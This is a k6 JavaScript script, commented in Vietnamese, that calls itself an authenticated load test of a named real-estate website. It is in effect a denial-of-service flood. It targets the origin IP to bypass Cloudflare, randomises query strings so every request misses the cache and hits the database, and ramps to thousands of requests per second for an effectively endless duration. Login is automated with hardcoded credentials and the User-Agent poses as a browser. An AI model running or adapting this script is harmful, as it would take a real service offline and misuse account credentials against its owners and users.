import http from 'k6/http';
import { check, sleep } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';
import { randomIntBetween, randomItem } from 'https://jslib.k6.io/k6-utils/1.4.0/index.js';

/* ==================================================================
   K6 AUTHENTICATED LOAD TEST - thanhhuyreal.com
   - Dùng PHPSESSID đã login sẵn
   - Hit thẳng IP gốc (bypass Cloudflare)
   - Random params để bypass cache, ép server query DB mỗi request
   - Multi-endpoint: search, listing, detail, API...
   ================================================================== */

const IP_URL  = (__ENV.IP_URL   || 'http://103.211.206.175').replace(/\/+$/, '');
const HOST    = __ENV.SITE_HOST || 'thanhhuyreal.com';

// PHPSESSID: dung env var neu co, neu khong setup() se tu dong login
const PHPSESSID_ENV = __ENV.PHPSESSID || '';

const IDENTIFIER = __ENV.PHP_IDENTIFIER || 'lonussystem';
const PASSWORD   = __ENV.PHP_PASSWORD   || 'lonussystem123@';

// ===== Config =====
const STAGES_RAW  = __ENV.STAGES      || '30s:500,60s:2000,60s:5000,876000h:5000';
const START_RATE  = parseInt(__ENV.START_RATE  || '100',  10);
const PRE_VUS     = parseInt(__ENV.PRE_VUS     || '500',  10);
const MAX_VUS     = parseInt(__ENV.MAX_VUS     || '8000', 10);
const TIMEOUT     = __ENV.REQUEST_TIMEOUT      || '30s';
const MAX_ERR     = parseFloat(__ENV.MAX_ERR_RATE || '0.9');

// ===== Parse STAGES =====
const STAGES = STAGES_RAW.split(',').map(p => {
  const [d, t] = p.trim().split(':');
  return { duration: d.trim(), target: parseInt(t, 10) };
});

// ===== Headers chung (dung session tu setup) =====
function makeHeaders(session) {
  return {
    'Host':              HOST,
    'Cookie':           `PHPSESSID=${session}`,
    'User-Agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Accept':           'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language':  'vi-VN,vi;q=0.9,en;q=0.8',
    'Accept-Encoding':  'gzip, deflate',
    'Connection':       'keep-alive',
    'Cache-Control':    'no-cache',
    'Pragma':           'no-cache',
  };
}

function makeApiHeaders(session) {
  return Object.assign({}, makeHeaders(session), {
    'Accept':           'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type':     'application/x-www-form-urlencoded; charset=UTF-8',
  });
}

// ===== Endpoints nặng (DB query mỗi lần, không cache dc) =====
// Thêm endpoint API cụ thể của site vào đây
const HEAVY_PAGES = [
  // Trang chủ (search tổng)
  () => `${IP_URL}/?_=${Date.now()}&r=${randomIntBetween(1, 99999)}`,

  // Search với filter khác nhau (ép DB full query)
  () => `${IP_URL}/?loai=${randomIntBetween(1,5)}&gia_tu=${randomIntBetween(1,10)*500}&gia_den=${randomIntBetween(10,50)*1000}&dt=${randomIntBetween(30,500)}&_=${Date.now()}`,
  () => `${IP_URL}/?tinh=${randomIntBetween(1,63)}&huyen=${randomIntBetween(1,300)}&loai=${randomIntBetween(1,5)}&_=${Date.now()}`,
  () => `${IP_URL}/?q=${randomIntBetween(1,9999)}&page=${randomIntBetween(1,50)}&_=${Date.now()}`,

  // Listing pages
  () => `${IP_URL}/nha-dat-ban?page=${randomIntBetween(1,100)}&sort=${randomItem(['newest','price_asc','price_desc','area'])}&_=${Date.now()}`,
  () => `${IP_URL}/nha-dat-cho-thue?page=${randomIntBetween(1,100)}&_=${Date.now()}`,
  () => `${IP_URL}/can-ho-chung-cu?page=${randomIntBetween(1,50)}&_=${Date.now()}`,
  () => `${IP_URL}/dat-nen?page=${randomIntBetween(1,50)}&_=${Date.now()}`,

  // Detail pages (mỗi ID khác = DB lookup khác)
  () => `${IP_URL}/bat-dong-san/${randomIntBetween(1,5000)}?_=${Date.now()}`,
  () => `${IP_URL}/tin-tuc/${randomIntBetween(1,1000)}?_=${Date.now()}`,
];

// API endpoints (nếu site có - nặng hơn vì JSON + DB)
const HEAVY_APIS = [
  // Thêm các API endpoint của site vào đây
  () => ({
    url: `${IP_URL}/model/listings`,
    body: `page=${randomIntBetween(1,100)}&limit=20&loai=${randomIntBetween(1,5)}&sort=newest&_=${Date.now()}`,
  }),
  () => ({
    url: `${IP_URL}/model/search`,
    body: `q=nhà+đất&tinh=${randomIntBetween(1,63)}&gia_tu=${randomIntBetween(1,5)*1000}&page=${randomIntBetween(1,50)}`,
  }),
  () => ({
    url: `${IP_URL}/model/get-listings`,
    body: `type=${randomIntBetween(1,5)}&province=${randomIntBetween(1,63)}&page=${randomIntBetween(1,100)}`,
  }),
];

// ===== Metrics =====
const req2xx   = new Counter('req_2xx');
const req4xx   = new Counter('req_4xx');
const req5xx   = new Counter('req_5xx');
const reqErr   = new Counter('req_error');
const errRate  = new Rate('error_rate');
const reqDur   = new Trend('req_duration');

// ===== Auto-login: chay 1 lan truoc khi flood =====
export function setup() {
  // Neu co PHPSESSID san thi dung luon
  if (PHPSESSID_ENV) {
    console.log('Dung PHPSESSID tu env: ' + PHPSESSID_ENV.substring(0, 8) + '...');
    return { session: PHPSESSID_ENV };
  }

  console.log('Auto-login: GET csrf token...');

  // Buoc 1: GET trang login lay PHPSESSID + csrf_token
  const loginPageRes = http.get(`${IP_URL}/?auth=login`, {
    headers: {
      'Host':       HOST,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
      'Accept':     'text/html,application/xhtml+xml',
    },
    timeout: '30s',
  });

  if (loginPageRes.status !== 200) {
    console.error('GET login page that bai: status=' + loginPageRes.status);
    return { session: '' };
  }

  // Lay csrf_token tu HTML
  const csrfMatch = loginPageRes.body.match(/name="csrf_token"\s+value="([^"]+)"/);
  if (!csrfMatch) {
    console.error('Khong tim thay csrf_token trong HTML');
    return { session: '' };
  }
  const csrfToken = csrfMatch[1];
  console.log('CSRF: ' + csrfToken.substring(0, 10) + '...');

  // Lay PHPSESSID tu cookie
  const cookieHeader = loginPageRes.headers['Set-Cookie'] || '';
  const sessMatch = cookieHeader.match(/PHPSESSID=([^;]+)/);
  const phpSessId = sessMatch ? sessMatch[1] : '';

  // Buoc 2: POST login
  const loginBody = [
    `csrf_token=${encodeURIComponent(csrfToken)}`,
    `identifier=${encodeURIComponent(IDENTIFIER)}`,
    `password=${encodeURIComponent(PASSWORD)}`,
  ].join('&');

  const loginRes = http.post(`${IP_URL}/model/login`, loginBody, {
    headers: {
      'Host':              HOST,
      'Cookie':            `PHPSESSID=${phpSessId}`,
      'Content-Type':      'application/x-www-form-urlencoded; charset=UTF-8',
      'Accept':            'application/json',
      'X-Requested-With':  'XMLHttpRequest',
      'User-Agent':        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
      'Referer':           `http://${HOST}/?auth=login`,
    },
    timeout: '30s',
  });

  console.log('Login response status: ' + loginRes.status);

  let json = null;
  try { json = loginRes.json(); } catch(e) {}

  if (json && json.status === true) {
    console.log('Login THANH CONG! Session: ' + phpSessId.substring(0, 8) + '...');
    return { session: phpSessId };
  } else {
    const msg = json ? JSON.stringify(json) : loginRes.body.substring(0, 100);
    console.warn('Login that bai: ' + msg);
    return { session: phpSessId }; // Dung session du chua xac nhan duoc
  }
}

export const options = {
  discardResponseBodies: true, // Không parse body → tiết kiệm CPU
  scenarios: {
    // Scenario 1: Flood trang nặng (GET)
    heavy_pages: {
      executor:        'ramping-arrival-rate',
      startRate:       START_RATE,
      timeUnit:        '1s',
      preAllocatedVUs: PRE_VUS,
      maxVUs:          MAX_VUS,
      stages:          STAGES,
      exec:            'hitPage',
    },
    // Scenario 2: Flood API (POST) - chạy song song
    heavy_apis: {
      executor:        'ramping-arrival-rate',
      startRate:       Math.floor(START_RATE / 2),
      timeUnit:        '1s',
      preAllocatedVUs: Math.floor(PRE_VUS / 2),
      maxVUs:          Math.floor(MAX_VUS / 2),
      stages:          STAGES,
      exec:            'hitApi',
    },
  },
  thresholds: {
    error_rate: [`rate<${MAX_ERR}`],
  },
};

// ===== Hit trang HTML nặng =====
export function hitPage(data) {
  const HEADERS = makeHeaders(data.session);
  const fn  = HEAVY_PAGES[randomIntBetween(0, HEAVY_PAGES.length - 1)];
  const url = fn();
  const res = http.get(url, { headers: HEADERS, timeout: TIMEOUT, tags: { name: 'page' } });

  const s = res.status;
  reqDur.add(res.timings.duration);
  errRate.add(s === 0 || s >= 500);

  if (s >= 200 && s < 400) req2xx.add(1);
  else if (s >= 400 && s < 500) req4xx.add(1);
  else if (s >= 500) req5xx.add(1);
  else reqErr.add(1);

  check(res, { 'khong 5xx': r => r.status < 500 });
}

// ===== Hit API POST nặng =====
export function hitApi(data) {
  const API_HEADERS = makeApiHeaders(data.session);
  const fn  = HEAVY_APIS[randomIntBetween(0, HEAVY_APIS.length - 1)];
  const { url, body } = fn();
  const res = http.post(url, body, { headers: API_HEADERS, timeout: TIMEOUT, tags: { name: 'api' } });

  const s = res.status;
  reqDur.add(res.timings.duration);
  errRate.add(s === 0 || s >= 500);

  if (s >= 200 && s < 400) req2xx.add(1);
  else if (s >= 400 && s < 500) req4xx.add(1);
  else if (s >= 500) req5xx.add(1);
  else reqErr.add(1);

  check(res, { 'api khong 5xx': r => r.status < 500 });
}
